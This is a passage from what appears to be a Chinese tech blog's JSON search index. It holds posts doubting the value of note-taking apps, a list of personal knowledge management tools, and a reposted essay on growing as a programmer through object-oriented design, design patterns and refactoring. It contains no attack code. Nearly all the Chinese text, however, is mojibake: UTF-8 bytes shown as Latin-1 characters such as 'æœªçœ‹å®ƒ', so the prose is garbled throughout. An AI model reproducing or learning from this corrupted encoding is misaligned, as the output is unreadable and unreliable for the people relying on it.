æœªçœ‹å®ƒæ—¶ï¼Œå®ƒä¸ä½ åŒå½’äºå¯‚ï¼Œä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰ã€‚\nã€Šé“¶æ²³è‹±é›„ä¼ è¯´ã€‹é‡Œæ¨å¨åˆ©è¯´è¿‡ä¸€å¥åè¨€ï¼šâ€œå¦‚æœä½ ä¸è®°å¾—äº†ï¼Œé‚£è¯´æ˜å®ƒä¸é‡è¦ã€‚â€ æˆ–è®¸å¯ä»¥å†è¡¥å……ä¸€å¥ï¼Œâ€œå¦‚æœä½ çœ‹ä¸å®Œï¼Œé‚£å°±æ²¡å¿…è¦çœ‹å®Œã€‚â€ å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œä¸çŸ¥ä¸è§‰å†™äº†è¿™ä¹ˆå¤šï¼Œä¸æ‰€æœ‰ç°åœ¨æˆ–æ›¾ç»çš„äº’è”ç½‘èµ„æºæ”¶é›†æˆç˜¾ç—‡æ‚£è€…å…±å‹‰ã€‚\nè½¬è‡ªV2EXä¸€ä½vå‹çš„å›ç­”\n","permalink":"https://www.hacktech.cn/post/%E7%AC%94%E8%AE%B0%E5%B8%A6%E7%BB%99%E6%88%91%E4%BB%AC%E6%98%AF%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E5%A2%9E%E9%95%BF%E4%B9%88%E4%BD%A0%E9%9C%80%E8%A6%81%E5%A5%BD%E5%A5%BD%E8%80%83%E8%99%91%E4%BA%86.html","summary":"\u003cp\u003eæˆ‘æœ‰æ®µæ—¶é—´ç–¯ç‹‚ä½¿ç”¨å„ç±»ç¬”è®°è½¯ä»¶ï¼Œç›¸ä¿¡ä»€ä¹ˆäº‘è®°å¿†ï¼Œç¬¬äºŒå¤§è„‘ä¹‹ç±»çš„è¯´æ³•ã€‚åæ¥å‘ç°ï¼Œæ²¡å•¥æ„ä¹‰ã€‚è®°å¤šäº†æ ¹æœ¬çœ‹ä¸å®Œï¼Œä½ åœ¨å½“æ—¶æ²¡æ—¶é—´çœ‹çš„ï¼Œè¿‡åæ›´æ²¡æ—¶é—´çœ‹ã€‚ç¬”è®°å”¯ä¸€å‰©ä¸‹çš„ä½œç”¨å°±æ˜¯æ£€ç´¢ï¼Œä½†æ˜¯ä½ æ²¡çœ‹è¿‡çš„å†…å®¹ï¼Œä½ åˆæ€ä¹ˆçŸ¥é“è¦æ£€ç´¢å•¥å‘¢ï¼Ÿè€Œä¸”ï¼Œè‡ªå·±ç»´æŠ¤çš„èµ„æ–™åº“ï¼Œæ€ä¹ˆä¹Ÿæ²¡åŠæ³•è·Ÿgoogleçš„æ£€ç´¢æ¯”ã€‚å–„ç”¨googleçš„æœç´¢è§„åˆ™ï¼Œæ¯”æµªè´¹æ—¶é—´å‰ªè—ä¿å­˜ä¸€å¤§å †ç½‘é¡µæœ‰æ•ˆå¾—å¤šã€‚\u003c/p\u003e","title":"ç¬”è®°å¸¦ç»™æˆ‘ä»¬æ˜¯çœŸå®çš„çŸ¥è¯†å¢é•¿ä¹ˆï¼Ÿä½ éœ€è¦å¥½å¥½è€ƒè™‘äº†"},{"content":"evernote(å°è±¡ç¬”è®°)\nWiz\næœ‰é“äº‘\néº¦åº“\nleanote\nGoogleKeep\nOneNote\nSimpleNote(wpå®¶çš„ï¼Œå…è´¹)\npocket(ç¨åè¯»çš„è½¯ä»¶ï¼ŒåŒç±»çš„è¿˜æœ‰Instapaperï¼Œå›½å†…çš„æ”¶è¶£)\nMyBase\nRaysNote(vå‹å¼€å‘)\nCintaNotes\nhttps://jitaku.io\nå¼€æº\nGitit-Bigger\nLaverna\npaperwork\nDokuWiki\nleanote\nPermaNote\nCherryTree\nBrainStorm\n","permalink":"https://www.hacktech.cn/post/pkm%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E7%B1%BB%E8%BD%AF%E4%BB%B6-%E5%81%B6%E5%B0%94%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8.html","summary":"\u003cp\u003eevernote(å°è±¡ç¬”è®°)\u003c/p\u003e\n\u003cp\u003eWiz\u003c/p\u003e","title":"PKMï¼ˆä¸ªäººçŸ¥è¯†ç®¡ç†ï¼‰ç±»è½¯ä»¶æ”¶é›†(å¶å°”æ›´æ–°åˆ—è¡¨)"},{"content":"è¯»äº†è¿™ç¯‡æ–‡ç« ä¹‹åæ„Ÿè§‰è›®å—å¯å‘çš„ï¼Œåœ¨æ­¤åˆ†äº«ä¸€ä¸‹ï¼ŒçŒ®ç»™å’Œæˆ‘ä¸€æ ·å¤„äºå›°æƒ‘çš„æœ‹å‹ã€‚\næ­£æ–‡å¦‚ä¸‹ï¼š\næœ¬äººä¹Ÿæ˜¯codingå¾ˆå¤šå¹´ï¼Œè™½ç„¶å¾ˆå¤±è´¥ï¼Œä½†ä¹Ÿæ€»ç®—æœ‰ç‚¹å¤±è´¥çš„å¿ƒå¾—ï¼Œä¸è¿‡æˆ‘åœ¨ä¸­å›½ï¼Œå¤§å¤šæ•°ç¨‹åºå‘˜éƒ½æ˜¯åƒæˆ‘ä¸€æ ·ï¼Œåœ¨ä¸€ç›´èµ°ç€å¼¯è·¯ã€‚å¦‚æœæƒ³æˆä¸ºä¸€ä¸ªæ¶æ„å¸ˆï¼Œå°±å¿…é¡»èµ°æ­£ç¡®çš„è·¯ï¼Œå¦åˆ™ç¦»ç›®æ ‡è¶Šæ¥è¶Šè¿œï¼Œæ­£åœ¨è¾›è‹¦å·¥ä½œçš„ç¨‹åºå‘˜ä»¬ï¼Œä½ ä»¬æœ‰æ²¡æœ‰ä¸‹é¢å‡ ç§æ„Ÿè§‰ï¼Ÿ\nä¸€ã€æˆ‘çš„å·¥ä½œå°±æ˜¯æŒ‰æ—¶å®Œæˆé¢†å¯¼äº¤ç»™æˆ‘çš„ä»»åŠ¡ï¼Œè‡³äºä»£ç å†™çš„æ€æ ·ï¼ŒçŸ¥é“æœ‰æ”¹è¿›ç©ºé—´ï¼Œä½†æ²¡æ—¶é—´å»æ”¹è¿›ï¼Œå…³é”®æ˜¯é¢†å¯¼ä¹Ÿä¸ç»™æ—¶é—´å•Šã€‚\näºŒã€æˆ‘å‘ç°æˆ‘çš„æ°´å¹³æ€»æ˜¯è·Ÿä¸ä¸ŠæŠ€æœ¯çš„è¿›æ­¥ï¼Œæœ‰å¤ªå¤šæƒ³å­¦çš„ä¸œè¥¿è¦å­¦ï¼ŒjQueryç”¨çš„äººæœ€è¿‘æ¯”è¾ƒå¤šå•Šï¼Œå¬è¯´æœ€è¿‘MVCæ¯”è¾ƒç«ï¼Œè¿˜æœ‰LINQï¼Œå¬è¯´å¾®è½¯åˆæœ‰Silverlightäº†â€¦â€¦\nä¸‰ã€æˆ‘å‘ç°è™½ç„¶æˆ‘å·¥ä½œå‡ å¹´äº†ï¼Œé™¤äº†ä¸åœçš„codingï¼ŒCtrl+Cå’ŒCtrl+Væ›´ç†Ÿç»ƒäº†ï¼Œä½†ç¼–ç æ°´å¹³å¹¶æ²¡æœ‰æé«˜ï¼Œè¿˜æ˜¯ä¸€ä¸ªæ™®é€šç¨‹åºå‘˜ï¼Œä½†æœ‰äººå·²ç»åšåˆ°æ¶æ„å¸ˆäº†ã€‚\nå››ã€å·¥ä½œå¥½å‡ å¹´äº†ï¼Œæƒ³è·³æ§½æ¢ä¸ªå·¥ä½œï¼Œç»“æœé¢è¯•çš„è€ƒå®˜éƒ½é—®äº†ä¸€äº›ä»€ä¹ˆæ•°æ®ç»“æ„ï¼Œä»€ä¹ˆåƒåœ¾å›æ”¶ï¼Œä»€ä¹ˆè®¾è®¡æ¨¡å¼ä¹‹ç±»çš„ä¸œè¥¿ï¼Œè™½ç„¶çœ‹è¿‡ï¼Œä½†æ˜¯å¹³æ—¶ç”¨ä¸ç€ï¼Œçœ‹äº†ä¹Ÿå¿˜è®°äº†ï¼Œå›ç­”ä¸ä¸Šæ¥ï¼Œç»“æœè€ƒå®˜è¯´æˆ‘åŸºç¡€å¤ªå·®ã€‚ã€‚ã€‚\næœ‰æ²¡æœ‰ï¼Œå¦‚æœæ²¡æœ‰ï¼Œæ¥ä¸‹æ¥å°±ä¸ç”¨çœ‹äº†ï¼Œä½ ä¸€å®šæ˜¯å¤§æ‹¿äº†ï¼Œæˆ–è€…å·²ç»æ˜ç™½å…¶ä¸­ä¹‹é“äº†ï¼Œå‘µå‘µã€‚\nå¦‚æœæœ‰ï¼Œæ­å–œä½ ï¼Œä½ è¿›å…¥å­¦ä¹ è¯¯åŒºäº†ï¼Œå¦‚æœæƒ³åœ¨æŠ€æœ¯ä¸Šå‰è¿›çš„è¯ï¼Œå°±ä¸èƒ½ä¸€ç›´çš„codingï¼Œä¸ºäº†å®Œæˆéœ€æ±‚è€Œå·¥ä½œï¼Œå¿…é¡»åœ¨codingçš„åŒæ—¶ï¼Œè®©æˆ‘ä»¬çš„æ€ç»´ï¼Œæ°´å¹³ä¹Ÿåœ¨ä¸åœçš„æé«˜ã€‚\nå†™ä»£ç è¦ç»å†ä¸‹é¢å‡ ä¸ªé˜¶æ®µã€‚\nä¸€ ã€ä½ å¿…é¡»å­¦ä¹ é¢å‘å¯¹è±¡çš„åŸºç¡€çŸ¥è¯†ï¼Œå¦‚æœè¿è¿™ä¸ªéƒ½å¿˜äº†ï¼Œé‚£ä½ çš„ç¼–ç¨‹ä¹‹è·¯æ³¨å®šæ˜¯åœ¨åšåŸå§‹åˆçº§çš„é‡å¤ï¼\nå¾ˆå¤šç¨‹åºå‘˜éƒ½çŸ¥é“ç±»ã€æ–¹æ³•ã€æŠ½è±¡ç±»ã€æ¥å£ç­‰æ¦‚å¿µï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¦é¢å‘å¯¹è±¡ï¼Œå¥½å¤„åœ¨å“ªé‡Œï¼Œè¦è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿåªæ˜¯æ˜ç™½æ¦‚å¿µï¼Œå°±æ˜¯è¡¨è¾¾ä¸æ¸…æ¥šï¼Œç„¶ååœ¨å® é™…å·¥ä½œä¸­ä¹Ÿç”¨ä¸ä¸Šï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œé¢å‘å¯¹è±¡çš„ä¸œè¥¿åˆæ¨¡ç³Šäº†ï¼Œç»“æœæ˜¯å¤§å¤šæ•°ç¨‹åºå‘˜ç”¨ç€é¢å‘å¯¹è±¡çš„è¯­è¨€åšç€é¢å‘è¿‡ç¨‹çš„å·¥ä½œï¼Œå› æ­¤è¦å­¦ä¹ é¢å‘å¯¹è±¡ï¼Œé¦–å…ˆåº”è¯¥æ˜ç™½ é¢å‘å¯¹è±¡çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ\né¢å‘å¯¹è±¡çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ\nå¼€å‘è¯­è¨€åœ¨ä¸æ–­å‘å±•ï¼Œä»æœºå™¨è¯­è¨€ï¼Œåˆ°æ±‡ç¼–ï¼Œåˆ°é«˜çº§è¯­è¨€ï¼Œå†åˆ°ç¬¬å››ä»£è¯­è¨€;è½¯ä»¶å¼€å‘æ–¹æ³•åœ¨ä¸æ–­å‘å±•ï¼Œä»é¢å‘è¿‡ç¨‹ï¼Œé¢å‘å¯¹è±¡ï¼Œåˆ°é¢å‘æ–¹é¢ç­‰ã€‚è™½ç„¶è¿™äº›éƒ½åœ¨ä¸æ–­å‘å±•ï¼Œä½†å…¶æ‰€è¿½æ±‚çš„ç›®æ ‡å´ä¸€ç›´æ²¡å˜ï¼Œè¿™äº›ç›®æ ‡å°±æ˜¯ï¼š\n1. é™ä½è½¯ä»¶å¼€å‘çš„å¤æ‚åº¦\n2. æé«˜è½¯ä»¶å¼€å‘çš„æ•ˆç‡\n3. æé«˜è½¯ä»¶è´¨é‡ï¼šå¯ç»´æŠ¤æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯é‡ç”¨æ€§ç­‰ã€‚\nå…¶ä¸­è¯­è¨€çš„å‘å±•ï¼Œå¼€å‘æ–¹æ³•çš„å‘å±•åœ¨1,2ä¸¤æ¡ä¸Šé¢å–å¾—äº†æå¤§çš„è¿›æ­¥ï¼Œä½†å¯¹äºç¬¬3æ¡ï¼Œæˆ‘ä»¬ä¸èƒ½å…‰æŒ‡æœ›å¼€å‘æ–¹æ³•æœ¬èº«æ¥è§£å†³ã€‚\næé«˜è½¯ä»¶è´¨é‡ï¼šå¯ç»´æŠ¤æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯é‡ç”¨æ€§ç­‰ï¼Œå†å…·ä½“ç‚¹ï¼Œå°±æ˜¯é«˜å†…èšã€ä½è€¦åˆï¼Œé¢å‘å¯¹è±¡å°±æ˜¯ä¸ºäº†è§£å†³ç¬¬3æ¡çš„é—®é¢˜ã€‚å› æ­¤è¦æˆä¸ºä¸€ä¸ªå¥½çš„ç¨‹åºå‘˜ï¼Œæœ€ç»•ä¸å¼€çš„å°±æ˜¯é¢å‘å¯¹è±¡äº†ã€‚\näºŒã€ è¦æƒ³å­¦å¥½é¢å‘å¯¹è±¡ï¼Œå°±å¿…é¡»å­¦ä¹ è®¾è®¡æ¨¡å¼ã€‚\nå‡å®šæˆ‘ä»¬äº†è§£äº†é¢å‘å¯¹è±¡çš„ç›®çš„ï¼Œæ¦‚å¿µäº†ï¼Œä½†æ˜¯æˆ‘ä»¬codingè¿‡ç¨‹ä¸­å´å‘ç°ï¼Œæˆ‘ä»¬çš„é¢å‘å¯¹è±¡çš„çŸ¥è¯†ä¼¼ä¹ä¸€ç›´æ´¾ä¸ä¸Šç”¨åœºï¼Œå…¶å®é“ç†å¾ˆç®€å•ï¼Œæ˜¯å› ä¸º æˆ‘ä»¬ä¸çŸ¥é“æ€ä¹ˆå»ç”¨ï¼Œå°±åƒæ¸¸æ³³ä¸€æ ·ï¼Œæˆ‘ä»¬å·²ç»æ˜ç™½äº†æ¸¸æ³³çš„å¥½å¤„ï¼Œä»¥åŠæ¸¸æ³³çš„å‡ ç§å§¿åŠ¿ï¼Œç‹—åˆ¨ã€ä»°æ³³ã€è›™æ³³ã€è‡ªç”±æ³³ï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶ä¸ä¼šæ¸¸æ³³ã€‚ã€‚ã€‚ã€‚\nå› æ­¤æœ‰äº†è¿™äº›åŸºæœ¬åŸåˆ™æ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬å¿…é¡»æœ‰ä¸€äº›æ›´ç»†çš„åŸåˆ™å»æŒ‡å¯¼æˆ‘ä»¬çš„è®¾è®¡ï¼Œè¿™å°±æœ‰äº†æ›´åŸºç¡€çš„é¢å‘å¯¹è±¡çš„äº”å¤§åŸåˆ™ï¼Œè€ŒæŠŠè¿™å‡ ç§åŸåˆ™æ›´è¯¦ç»†çš„åº”ç”¨ åˆ°å®é™…ä¸­æ¥ï¼Œè§£å†³å®é™…çš„é—®é¢˜ï¼Œè¿™å°±æ˜¯è®¾è®¡æ¨¡å¼ã€‚å› æ­¤è¦å­¦å¥½OOï¼Œå¿…é¡»è¦å­¦ä¹ è®¾è®¡æ¨¡å¼ï¼Œå­¦ä¹ è®¾è®¡æ¨¡å¼ï¼ŒæŒ‰å¤§å¸ˆçš„è¯è¯´ï¼Œå°±æ˜¯åœ¨äººç±»åŠªåŠ›è§£å†³çš„è®¸å¤šé¢†åŸŸçš„æˆåŠŸæ–¹ æ¡ˆéƒ½æ¥æºäºå„ç§æ¨¡å¼ï¼Œæ•™è‚²çš„ä¸€ä¸ªé‡è¦ç›®æ ‡å°±æ˜¯æŠŠçŸ¥è¯†çš„æ¨¡å¼ä¸€ä»£ä¸€ä»£ä¼ ä¸‹å»ã€‚\nå› æ­¤å­¦ä¹ è®¾è®¡æ¨¡å¼ï¼Œå°±åƒæˆ‘ä»¬åœ¨çœ‹ä¸–ç•Œé¡¶çº§çš„æ¸¸æ³³æ¯”èµ›ï¼Œæˆ‘ä»¬ä¸ºä¹‹ç–¯ç‹‚ï¼Œä¸ºä¹‹ç€è¿·ã€‚\nä¸‰ã€å­¦ä¹ è®¾è®¡æ¨¡å¼\næ­£åƒæˆ‘ä»¬å¹¶ä¸æƒ³åªæ˜¯çœ‹åˆ«äººè¡¨æ¼”ï¼Œæˆ‘ä»¬è¦è‡ªå·±å­¦ä¼šæ¸¸æ³³ï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬çš„ç›®çš„æ‰€åœ¨ã€‚\nå½“æˆ‘ä»¬çœ‹å®Œå‡ ç¯‡è®¾è®¡æ¨¡å¼åï¼Œæˆ‘ä»¬ä¸ºä¹‹ç²¾ç¥æŒ¯å¥‹ï¼Œåœ¨æ–°çš„codingçš„æ—¶å€™ï¼Œæˆ‘ä»¬æ€»æ˜¯æƒ³åŠªåŠ›çš„ç”¨ä¸Šå­¦åˆ°çš„è®¾è®¡æ¨¡å¼ï¼Œä½†æ˜¯ç»å¸¸åœ¨è¯¯ç”¨æ¨¡å¼ï¼ŒæŠ˜è…¾åŠå¤©å‘ç°æ˜¯åœ¨è„±è£¤å­æŠ“ç—’ã€‚ã€‚ã€‚\nå½“å­¦å®Œè®¾è®¡æ¨¡å¼ä¹‹åï¼Œæˆ‘ä»¬åˆå¾ˆå›°æƒ‘ï¼Œæ„Ÿè§‰è¿™äº›æ¨¡å¼ç®€ç›´å¤ªåƒäº†ï¼Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬åˆ†ä¸æ¸…è¿™äº›æ¨¡å¼ä¹‹é—´åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œè€Œä¸”æ˜ç™½äº†è®¾è®¡è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªè‡´å‘½ çš„ä¸œè¥¿â€”â€”è¿‡åº¦è®¾è®¡ï¼Œå› ä¸ºè®¾è®¡æ¨¡å¼è¦æ±‚æˆ‘ä»¬é«˜æ‰©å±•æ€§ï¼Œé«˜é‡ç”¨æ€§ï¼Œä½†æ˜¯åœ¨éœ€æ±‚æå‡ºä¹‹åˆï¼Œæˆ‘ä»¬éƒ½ä¸æ˜¯ç¥ï¼Œé™¤äº†ä¾é è¿‡å»çš„ç»éªŒæ¥åˆ¤æ–­å¤–ï¼Œæˆ‘ä»¬ä¸çŸ¥é“å“ªäº›åœ°æ–¹è¦æ‰© å±•ï¼Œå“ªäº›åœ°æ–¹è¦é‡ç”¨ï¼Œè€Œä¸”è¿‡å»çš„ç»éªŒå°±ä¸€å®šæ˜¯æ­£ç¡®çš„å—ï¼Ÿæ‰€ä»¥æˆ‘ä»¬ç”šè‡³ä¸æ•¢å†è½»æ˜“ç”¨è®¾è®¡æ¨¡å¼ï¼Œè€Œæ˜¯è¿˜ä¸€ç›´åœ¨ç”¨é¢å‘è¿‡ç¨‹çš„æ–¹æ³•åœ¨å®ç°éœ€æ±‚ã€‚\nå››ã€å­¦ä¹ é‡æ„\nç²¾å½©çš„ä»£ç æ˜¯æ€ä¹ˆæƒ³å‡ºæ¥çš„ï¼Œæ¯”çœ‹åˆ°ç²¾å½©çš„ä»£ç æ›´åŠ ä»¤äººæœŸå¾…ã€‚äºæ˜¯æˆ‘ä»¬å¼€å§‹æ€è€ƒï¼Œè¿™äº›å¤§å¸ˆä»¬è«éä¸ç”¨å·¥ä½œï¼Œéœ€æ±‚æ¥äº†æ²¡æœ‰é¢†å¯¼è§„å®šå®Œæˆæ—¶é—´ï¼Œåªä»¥è®¾ è®¡ç²¾å½©çš„ä»£ç ä¸ºæ ‡å‡†æ¥å¼€å±•å·¥ä½œï¼Ÿè¿™æ ·çš„å·¥ä½œå¤ªçˆ½äº†ï¼Œä¹Ÿä¸å¯èƒ½ï¼Œè€æ¿ä¸æ„¿æ„å•Šã€‚å°±ç®—è¿™äº›ç†æƒ³çš„æ¡ä»¶ä»–éƒ½æœ‰ï¼Œä»–å°±ä¸€å¼€å§‹å°±è®¾è®¡å‡ºå®Œç¾çš„ä»£ç æ¥äº†ï¼Ÿä¹Ÿä¸å¯èƒ½å•Šï¼Œ é™¤éä»–æ˜¯ç¥ï¼Œä¸€å¼€å§‹å°±é¢„æ–™åˆ°æœªæ¥çš„æ‰€æœ‰éœ€æ±‚ï¼Œé‚£æ—¢ç„¶è¿™äº›æ¡ä»¶éƒ½æ²¡æœ‰ï¼Œä»–ä»¬å¦‚ä½•å†™å‡ºçš„ç²¾å½©ä»£ç ï¼Ÿ\nJoshua Kerievskyåœ¨é‚£ç¯‡è‘—åçš„ã€Šæ¨¡å¼ä¸XPã€‹ã€”æ”¶å½•äºã€Šæé™ç¼–ç¨‹ç ”ç©¶ã€‹ä¸€ä¹¦ï¼‰ä¸­æ˜ç™½åœ°æŒ‡å‡ºï¼šåœ¨è®¾è®¡å‰æœŸä½¿ç”¨æ¨¡å¼å¸¸å¸¸å¯¼è‡´è¿‡åº¦å·¥ç¨‹ï¼ˆover- engineering)ã€‚è¿™æ˜¯ä¸€ä¸ªæ®‹é…·çš„ç°å®ï¼Œå•å‡­å¯¹å®Œç¾çš„è¿½æ±‚æ— æ³•å†™å‡ºå®ç”¨çš„ä»£ç ï¼Œè€Œã€Œå®ç”¨ã€æ˜¯è½¯ä»¶å‹å€’ä¸€åˆ‡çš„è¦ç´ ã€‚\nåœ¨ã€Šé‡æ„â€”â€”æ”¹å–„æ—¢æœ‰çš„ä»£ç çš„è®¾è®¡ã€‹ä¸€ä¹¦ä¸­æåˆ°ï¼Œé€šè¿‡é‡æ„ï¼ˆrefactoringï¼‰ï¼Œä½ å¯ä»¥æ‰¾å‡ºæ”¹å˜çš„å¹³è¡¡ç‚¹ã€‚ä½ ä¼šå‘ç°æ‰€è°“è®¾è®¡ä¸å†æ˜¯ä¸€åˆ‡åŠ¨ ä½œçš„å‰æï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªå¼€å‘è¿‡ç¨‹ä¸­é€æ¸æµ®ç°å‡ºæ¥ã€‚åœ¨ç³»ç»Ÿæ„ç­‘è¿‡ç¨‹ä¸­ï¼Œä½ å¯ä»¥å­¦ä¹ å¦‚ä½•å¼ºåŒ–è®¾è®¡ï¼›å…¶é—´å¸¦æ¥çš„äº’åŠ¨å¯ä»¥è®©ä¸€ä¸ªç¨‹åºåœ¨å¼€å‘è¿‡ç¨‹ä¸­æŒç»­ä¿æœ‰è‰¯å¥½çš„è®¾ è®¡ã€‚\næ€»ç»“èµ·æ¥å°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨è®¾è®¡å‰æœŸå°±ä½¿ç”¨è®¾è®¡æ¨¡å¼ï¼Œå¾€å¾€å¯¼è‡´è®¾è®¡è¿‡åº¦ï¼Œå› æ­¤åº”è¯¥åœ¨æ•´ä¸ªå¼€å‘è¿‡ç¨‹ï¼Œæ•´ä¸ªéœ€æ±‚å˜æ›´è¿‡ç¨‹ä¸­ä¸æ–­çš„é‡æ„ç°åœ¨çš„ä»£ç ï¼Œæ‰èƒ½è®© ç¨‹åºä¸€ç›´ä¿æŒè‰¯å¥½çš„è®¾è®¡ã€‚ç”±æ­¤å¯è§ï¼Œå¼€å‘è¿‡ç¨‹ä¸­éœ€è¦ä¸€ç›´é‡æ„ï¼Œå¦åˆ™æ— è®ºå½“åˆè®¾è®¡å¤šä¹ˆçš„å¥½ï¼Œéšç€éœ€æ±‚çš„æ”¹å˜ï¼Œéƒ½ä¼šå˜æˆä¸€å †çƒ‚ä»£ç ï¼Œéš¾ä»¥ç»´æŠ¤ï¼Œéš¾ä»¥æ‰©å±•ã€‚æ‰€è°“ é‡æ„æ˜¯è¿™æ ·ä¸€ä¸ªè¿‡ç¨‹ï¼šã€Œåœ¨ä¸æ”¹å˜ä»£ç å¤–åœ¨è¡Œä¸ºçš„å‰æä¸‹ï¼Œå¯¹ä»£ç åšå‡ºä¿®æ”¹ï¼Œä»¥æ”¹è¿›ç¨‹åºçš„å†…éƒ¨ç»“æ„ã€ã€‚é‡æ„çš„ç›®æ ‡ï¼Œå°±æ˜¯è®¾è®¡æ¨¡å¼ï¼Œæ›´æœ¬è´¨çš„è®²å°±æ˜¯ä½¿ç¨‹åºçš„æ¶æ„ æ›´è¶‹åˆç†ï¼Œä»è€Œæé«˜è½¯ä»¶çš„å¯ç»´æŠ¤æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯é‡ç”¨æ€§ã€‚\nã€Šé‡æ„â€”â€”æ”¹å–„æ—¢æœ‰çš„ä»£ç çš„è®¾è®¡ã€‹ä¸€ä¹¦ä¹Ÿæ˜¯Martin Fowlerç­‰å¤§å¸ˆçš„ä½œå“ï¼Œè½¯ä»¶å·¥ç¨‹é¢†åŸŸçš„è¶…çº§ç»å…¸å·¨è‘—ï¼Œä¸å¦ä¸€å·¨è‘—ã€Šè®¾è®¡æ¨¡å¼ã€‹å¹¶ç§°\u0026quot;è½¯å·¥åŒé›„\u0026quot;ï¼Œä¸å¯ä¸è¯»å•Šã€‚\näº”ã€å¼€å§‹é€šå¾€ä¼˜ç§€è½¯ä»¶è®¾è®¡å¸ˆçš„è·¯ä¸Š\né€šè¿‡è®¾è®¡æ¨¡å¼å’Œé‡æ„ï¼Œæˆ‘ä»¬çš„æ‰€å­¦å’Œæˆ‘ä»¬å·¥ä½œçš„codingç»ˆäºç»“åˆä¸Šäº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å·¥ä½œä¸­ç”¨é¢å‘å¯¹è±¡çš„æ€ç»´å»è€ƒè™‘é—®é¢˜ï¼Œå¹¶å¼€å§‹å­¦ä¹ é‡æ„äº†ã€‚è¿™å°± åƒæ¸¸æ³³ä¸€æ ·ï¼Œæˆ‘ä»¬çœ‹å®Œäº†å„ç§é¡¶çº§çš„æ¸¸æ³³æ¯”èµ›ï¼Œæ˜ç™½å„ç§è§„åˆ™ï¼Œåäººä½¿ç”¨çš„æ–¹æ³•å’ŒæŠ€å·§ï¼Œç°åœ¨æ˜¯æ—¶å€™å›å®¶å»æ‘æ—è¾¹çš„å°æ²³é‡Œç»ƒç»ƒäº†ã€‚ç»ƒä¹ ä¹Ÿæ˜¯éœ€è¦æœ‰æ•™ç»ƒçš„ï¼Œæ¨èå¦ ä¸€æœ¬ç»å…¸ä¹¦å«ã€Šé‡æ„ä¸æ¨¡å¼ã€‹ï¼Œå¼•ç”¨ä»–å¼€ç¯‡çš„ä»‹ç»ï¼Œæœ¬ä¹¦å¼€åˆ›æ€§åœ°æ·±å…¥æ­ç¤ºäº†é‡æ„ä¸æ¨¡å¼è¿™ä¸¤ç§è½¯ä»¶å¼€å‘å…³é”®æŠ€æœ¯ä¹‹é—´çš„è”ç³»ï¼Œè¯´æ˜äº†é€šè¿‡é‡æ„å®ç°æ¨¡å¼æ”¹å–„æ—¢æœ‰çš„ è®¾è®¡ï¼Œå¾€å¾€ä¼˜äºåœ¨æ–°çš„è®¾è®¡æ—©æœŸä½¿ç”¨æ¨¡å¼ã€‚æœ¬ä¹¦ä¸ä»…å±•ç¤ºäº†ä¸€ç§åº”ç”¨æ¨¡å¼å’Œé‡æ„çš„åˆ›æ–°æ–¹æ³•ï¼Œè€Œä¸”æœ‰åŠ©äºè¯»è€…ç»“åˆå®æˆ˜æ·±å…¥ç†è§£é‡æ„å’Œæ¨¡å¼ã€‚\nè¿™æœ¬ä¹¦æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„æ•™ç»ƒï¼Œå€¼å¾—ä¸€è¯»ã€‚\nå…­ã€æ²¡æœ‰ç»ˆç‚¹ï¼Œåªæœ‰åšæŒä¸æ‡ˆçš„ä¸“ç ”å’ŒåŠªåŠ›ã€‚\nç»è¿‡äº†å‡ å¹´çš„åšæŒï¼Œç»ˆäºå­¦ä¼šäº†çµæ´»çš„è¿ç”¨å„ç§æ¨¡å¼ï¼Œæˆ‘ä»¬ä¸éœ€è¦å»åˆ»æ„çš„æƒ³ç”¨ä»€ä¹ˆæ¨¡å¼ï¼Œæ€ä¹ˆé‡æ„ã€‚ç¨‹åºçš„ç›®æ ‡ï¼Œå°±æ˜¯å¯ç»´æŠ¤æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯é‡ç”¨ æ€§ï¼Œéƒ½å·²ç»æˆäº†ä¸€ç§ç¼–ç¨‹ä¹ æƒ¯ï¼Œä¸€ç§æ€ç»´ä¹ æƒ¯ï¼Œå°±åƒæˆ‘ä»¬ç»ƒä¹ äº†å‡ å¹´æ¸¸æ³³ä¹‹åï¼Œæˆ‘ä»¬ä¸ç”¨å†åˆ»æ„çš„å»è€ƒè™‘ï¼Œå¦‚ä½•è®©è‡ªå·±èƒ½åœ¨æ°´ä¸Šæ¼‚èµ·æ¥ï¼Œä»°æ³³å’Œè›™æ³³çš„åŒº åˆ«\u0026hellip;.. è€Œæ˜¯è·³è¿›æ°´é‡Œï¼Œå°±è‡ªç„¶çš„æ¸¸äº†èµ·æ¥ï¼Œæœå¯¹å²¸æ¸¸å»ã€‚ä½†æ˜¯è¦å’Œå¤§å¸ˆæ¯”èµ·æ¥ï¼Œå˜¿å˜¿ï¼Œæˆ‘ä»¬è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ï¼Œæœ€ç»ˆä¹Ÿå¯èƒ½æˆä¸äº†å¤§å¸ˆï¼Œä½†æ— è®ºèƒ½ä¸èƒ½æˆä¸ºå¤§å¸ˆï¼Œæˆ‘ä»¬å·²ç» èµ°åœ¨äº†æˆä¸ºå¤§å¸ˆçš„æ­£ç¡®çš„è·¯ä¸Šï¼Œæˆ‘ä»¬å’Œåˆ«çš„ç¨‹åºå‘˜å·²ç»å¼€å§‹ä¸ä¸€æ ·ï¼Œå› 